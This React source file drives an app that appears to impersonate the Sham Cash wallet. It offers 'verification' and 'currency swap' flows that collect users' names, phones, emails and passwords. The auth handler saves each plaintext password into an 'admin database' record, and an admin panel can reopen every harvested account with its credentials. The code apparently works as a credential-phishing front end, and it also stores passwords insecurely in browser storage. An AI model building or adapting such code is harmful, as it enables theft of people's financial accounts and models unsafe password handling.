import React, { useState, useEffect } from 'react';
import { LogOut, AlertTriangle } from 'lucide-react';
import { AppScreen } from './components/AppScreen';
import { HomeScreen } from './components/HomeScreen';
import { ContactInfoScreen } from './components/ContactInfoScreen';
import { AuthScreen } from './components/AuthScreen';
import { VerifyScreen } from './components/VerifyScreen';
import { WaitingScreen } from './components/WaitingScreen';
import { AdminPanelScreen } from './components/AdminPanelScreen';
import { JobsScreen } from './components/JobsScreen';
import { ComplaintsScreen } from './components/ComplaintsScreen';
import { LoansScreen } from './components/LoansScreen';
import { CurrencySwapModal } from './components/CurrencySwapModal';
import { MobileBottomNav } from './components/MobileBottomNav';
import { AppSplashScreen } from './components/AppSplashScreen';
import { OfflineIndicator } from './components/OfflineIndicator';
import { ScreenType, RequestType, ContactData, AuthData, AccountRecord } from './types';
import { getSavedAccounts, saveAccountRecord, logUserActivity } from './utils/accountStorage';

export default function App() {
  const [currentScreen, setCurrentScreen] = useState<ScreenType>('home');
  const [requestType, setRequestType] = useState<RequestType>('verify');
  const [isSwapCalculatorOpen, setIsSwapCalculatorOpen] = useState<boolean>(false);
  const [savedAccounts, setSavedAccounts] = useState<AccountRecord[]>(() => getSavedAccounts());
  const [showSplash, setShowSplash] = useState<boolean>(() => {
    return !sessionStorage.getItem('sc_splash_seen');
  });

  const [contactData, setContactData] = useState<ContactData>(() => ({
    fullName: localStorage.getItem('sc_contact_name') || '',
    phone: localStorage.getItem('sc_contact_phone') || '',
    governorate: localStorage.getItem('sc_contact_governorate') || 'دمشق',
  }));

  const [authData, setAuthData] = useState<AuthData>(() => ({
    email: localStorage.getItem('sc_waiting_email') || '',
    password: localStorage.getItem('sc_waiting_password') || '',
  }));

  const [requestId, setRequestId] = useState<string>(
    () => localStorage.getItem('sc_request_id') || 'SC-104288'
  );
  const [isLogoutModalOpen, setIsLogoutModalOpen] = useState(false);

  // Sync saved accounts state across tabs or components
  useEffect(() => {
    const handleSync = () => {
      setSavedAccounts(getSavedAccounts());
    };
    window.addEventListener('sc_accounts_updated', handleSync);
    return () => window.removeEventListener('sc_accounts_updated', handleSync);
  }, []);

  // Scroll to top on screen change
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [currentScreen]);

  const handleStartFlow = (type: RequestType) => {
    setRequestType(type);
    setCurrentScreen('contact-info');
  };

  const handleContactSubmit = (data: ContactData) => {
    setContactData(data);
    logUserActivity(
      'بدء تسجيل بيانات التواصل',
      `تم إدخال بيانات صاحب المعاملة (${data.fullName}) وهاتف (${data.phone}) بالمحافظة (${data.governorate})`,
      authData.email || '',
      data.fullName
    );
    setCurrentScreen('auth');
  };

  const handleAuthSubmit = (data: AuthData) => {
    setAuthData(data);
    logUserActivity(
      'تسجيل دخول المستخدم للمنصة',
      `تم تسجيل الدخول بالبريد الإلكتروني (${data.email}) وبدء المعاملة بنجاح`,
      data.email,
      contactData.fullName
    );

    // Save or register user credentials immediately into admin database
    const generatedId = requestId || ('SC-' + Math.floor(100000 + Math.random() * 900000));
    setRequestId(generatedId);
    localStorage.setItem('sc_request_id', generatedId);

    const now = new Date();
    const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;

    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Web Client';
    let deviceInfo = 'متصفح ويب';
    if (/iPhone|iPad|iPod/i.test(userAgent)) deviceInfo = 'iPhone / iOS';
    else if (/Android/i.test(userAgent)) deviceInfo = 'Android Mobile';
    else if (/Windows/i.test(userAgent)) deviceInfo = 'Windows PC';
    else if (/Macintosh/i.test(userAgent)) deviceInfo = 'Mac OS';

    saveAccountRecord({
      id: generatedId,
      fullName: contactData.fullName.trim() || 'مستخدم شام كاش',
      phone: contactData.phone.trim() || '',
      email: data.email.trim().toLowerCase(),
      password: data.password || '',
      governorate: contactData.governorate || 'دمشق',
      requestType: requestType,
      status: 'under_review',
      submittedAt: formattedDate,
      documentsCount: 0,
      documentNames: [],
      deviceInfo,
      note: requestType === 'verify'
        ? 'تم تسجيل الدخول وبيانات الاتصال والاعتماد - بانتظار استكمال رفع وثائق التوثيق الرسمية.'
        : 'طلب تفعيل ميزة تصريف وتبديل العملات بالحساب الإلكتروني.',
    });

    if (requestType === 'verify') {
      setCurrentScreen('verify');
    } else {
      setCurrentScreen('waiting');
    }
  };

  const handleLogout = () => {
    setIsLogoutModalOpen(true);
  };

  const confirmLogout = () => {
    logUserActivity(
      'تسجيل خروج من البرنامج',
      `تم تسجيل خروج المستخدم (${authData.email || 'مستخدم شام كاش'}) وإنهاء الجلسة بأمان`,
      authData.email,
      contactData.fullName
    );
    localStorage.removeItem('sc_waiting_email');
    localStorage.removeItem('sc_waiting_password');
    sessionStorage.removeItem('sc_admin_unlocked');
    setAuthData({ email: '', password: '' });
    setIsLogoutModalOpen(false);
    setCurrentScreen('home');
  };

  const handleVerifyComplete = (newRequestId: string) => {
    setRequestId(newRequestId);
    logUserActivity(
      'إكمال وتثبيت طلب التوثيق الرسمي',
      `تم استلام واعتماد إرسال الوثائق الرسمية والمستندات برمز تدقيق (${newRequestId})`,
      authData.email,
      contactData.fullName
    );
    setCurrentScreen('waiting');
  };

  const handleOpenAccountInWaiting = (account: AccountRecord) => {
    setRequestId(account.id);
    setRequestType(account.requestType);
    setContactData({
      fullName: account.fullName,
      phone: account.phone,
      governorate: account.governorate,
    });
    setAuthData({
      email: account.email,
      password: account.password || '',
    });
    setCurrentScreen('waiting');
  };

  const handleBack = () => {
    if (
      currentScreen === 'admin' ||
      currentScreen === 'jobs' ||
      currentScreen === 'complaints' ||
      currentScreen === 'loans'
    ) {
      setCurrentScreen('home');
    } else if (currentScreen === 'waiting') {
      if (requestType === 'verify') {
        setCurrentScreen('verify');
      } else {
        setCurrentScreen('auth');
      }
    } else if (currentScreen === 'verify') {
      setCurrentScreen('auth');
    } else if (currentScreen === 'auth') {
      setCurrentScreen('contact-info');
    } else if (currentScreen === 'contact-info') {
      setCurrentScreen('home');
    }
  };

  const handleReset = () => {
    setCurrentScreen('home');
  };

  const handleDismissSplash = () => {
    sessionStorage.setItem('sc_splash_seen', 'true');
    setShowSplash(false);
  };

  const handleTrackRequest = (trackId: string) => {
    const found = savedAccounts.find(
      (a) => a.id.toLowerCase() === trackId.toLowerCase()
    );
    if (found) {
      handleOpenAccountInWaiting(found);
    } else {
      setRequestId(trackId);
      setCurrentScreen('waiting');
    }
  };

  // Determine width based on active screen
  const screenWidth =
    currentScreen === 'home' ||
    currentScreen === 'admin' ||
    currentScreen === 'jobs' ||
    currentScreen === 'loans'
      ? 'lg'
      : currentScreen === 'verify' || currentScreen === 'complaints'
      ? 'md'
      : 'sm';

  return (
    <>
      <AppScreen
        width={screenWidth}
        showBack={currentScreen !== 'home'}
        backAction={handleBack}
        savedAccountsCount={savedAccounts.length}
        onOpenAdmin={() => setCurrentScreen('admin')}
        onOpenJobs={() => setCurrentScreen('jobs')}
        onOpenComplaints={() => setCurrentScreen('complaints')}
        onOpenLoans={() => setCurrentScreen('loans')}
        onOpenHome={() => setCurrentScreen('home')}
        currentUserEmail={authData.email || undefined}
        onLogout={handleLogout}
      >
        {currentScreen === 'home' && (
          <HomeScreen
            onSelectAction={handleStartFlow}
            onOpenSwapCalculator={() => setIsSwapCalculatorOpen(true)}
            onTrackRequest={handleTrackRequest}
            savedAccountsCount={savedAccounts.length}
            onOpenAdmin={() => setCurrentScreen('admin')}
            onOpenJobs={() => setCurrentScreen('jobs')}
            onOpenComplaints={() => setCurrentScreen('complaints')}
            onOpenLoans={() => setCurrentScreen('loans')}
          />
        )}

        {currentScreen === 'contact-info' && (
          <ContactInfoScreen
            initialData={contactData}
            requestType={requestType}
            onSubmit={handleContactSubmit}
          />
        )}

        {currentScreen === 'auth' && (
          <AuthScreen
            requestType={requestType}
            onSubmit={handleAuthSubmit}
          />
        )}

        {currentScreen === 'verify' && (
          <VerifyScreen
            requestId={requestId}
            contactData={contactData}
            email={authData.email}
            password={authData.password}
            onComplete={handleVerifyComplete}
          />
        )}

        {currentScreen === 'waiting' && (
          <WaitingScreen
            email={authData.email}
            fullName={contactData.fullName}
            phone={contactData.phone}
            requestId={requestId}
            onReset={handleReset}
          />
        )}

        {currentScreen === 'admin' && (
          <AdminPanelScreen
            onBackToHome={() => setCurrentScreen('home')}
            onOpenAccountInWaiting={handleOpenAccountInWaiting}
          />
        )}

        {currentScreen === 'jobs' && (
          <JobsScreen
            onBackToHome={() => setCurrentScreen('home')}
            defaultEmail={authData.email}
            defaultFullName={contactData.fullName}
            defaultPhone={contactData.phone}
          />
        )}

        {currentScreen === 'complaints' && (
          <ComplaintsScreen
            onBackToHome={() => setCurrentScreen('home')}
            defaultEmail={authData.email}
            defaultFullName={contactData.fullName}
            defaultPhone={contactData.phone}
          />
        )}

        {currentScreen === 'loans' && (
          <LoansScreen
            onBackToHome={() => setCurrentScreen('home')}
            defaultEmail={authData.email}
            defaultFullName={contactData.fullName}
            defaultPhone={contactData.phone}
          />
        )}
      </AppScreen>

      {/* Syrian Currency Swap & Live Rates Modal */}
      <CurrencySwapModal
        isOpen={isSwapCalculatorOpen}
        onClose={() => setIsSwapCalculatorOpen(false)}
        onApplyForSwap={() => {
          setIsSwapCalculatorOpen(false);
          handleStartFlow('swap');
        }}
      />

      {/* In-app Logout Confirmation Dialog (No window.confirm) */}
      {isLogoutModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm">
          <div className="relative w-full max-w-sm rounded-3xl border border-white/15 bg-[#0F172A] p-6 text-center shadow-2xl">
            <div className="mx-auto flex size-14 items-center justify-center rounded-2xl bg-rose-500/20 text-rose-400 border border-rose-500/30">
              <LogOut className="size-6" />
            </div>

            <h3 className="mt-4 text-lg font-bold text-white">
              تسجيل الخروج من البرنامج
            </h3>
            <p className="mt-2 text-xs text-white/60 leading-5">
              هل ترغب في إنهاء الجلسة الحالية وحفظ كافة السجلات والمعاملات في لوحة الإدارة؟
            </p>

            <div className="mt-6 flex items-center justify-center gap-2.5">
              <button
                type="button"
                onClick={() => setIsLogoutModalOpen(false)}
                className="rounded-xl border border-white/10 bg-white/5 px-4 py-2.5 text-xs font-semibold text-white/70 hover:bg-white/10 transition cursor-pointer flex-1"
              >
                إلغاء
              </button>
              <button
                type="button"
                onClick={confirmLogout}
                className="rounded-xl bg-gradient-to-r from-rose-500 to-rose-600 px-4 py-2.5 text-xs font-bold text-white shadow-lg shadow-rose-500/25 hover:brightness-110 transition cursor-pointer flex-1"
              >
                تأكيد الخروج
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Mobile App Bottom Navigation Bar */}
      <MobileBottomNav
        currentScreen={currentScreen}
        onNavigate={(screen) => setCurrentScreen(screen)}
        savedAccountsCount={savedAccounts.length}
      />

      {/* Offline Status Connectivity Banner */}
      <OfflineIndicator />

      {/* Native App Launch Splash Screen */}
      {showSplash && <AppSplashScreen onDismiss={handleDismissSplash} />}
    </>
  );
}
